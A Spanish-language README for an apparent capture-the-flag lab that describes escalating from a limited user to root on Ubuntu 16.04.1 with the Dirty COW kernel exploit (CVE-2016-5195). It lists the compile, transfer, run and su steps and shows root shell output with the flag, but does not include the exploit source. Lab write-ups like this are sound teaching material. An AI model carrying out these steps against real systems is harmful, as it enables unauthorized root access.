# dirtycow-lab
Explotación vulnerabilidad Dirty COW (CVE-2016-5195) en Ubuntu 16.04.1.

cat > README.md <<'EOF'
# 🐮 Dirty COW Exploit (CVE-2016-5195)

## 📌 Descripción
Este laboratorio demuestra la explotación de la vulnerabilidad **Dirty COW** en un sistema **Ubuntu Server 16.04.1** con kernel vulnerable.  
El objetivo fue **escalar privilegios** desde un usuario limitado (`student`) hasta `root` y capturar la flag ubicada en `/root/flag.txt`.

## 🛠️ Proceso realizado
1. **Verificación del kernel**: `Linux 4.4.0-31-generic` (vulnerable).
2. **Compilación del exploit**: en Kali dentro de Docker `ubuntu:16.04` se compiló `dirtycow_passwd.c` → binario `dirty`.
3. **Transferencia**: `scp dirty student@<IP>:~/`.
4. **Ejecución y escalada**: `chmod +x ~/dirty && ~/dirty` → `su root` (pass `dirtyCowFun`).
5. **Flag**: `cat /root/flag.txt` → `4GEEKS{Y0u_G0t_R00t}`.

## ✅ Resultado
```bash
root@ubuntu:/home/student# whoami
root
root@ubuntu:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/student# cat /root/flag.txt
4GEEKS{Y0u_G0t_R00t}

![Flag obtenida](evidencias/dirtycow.png)
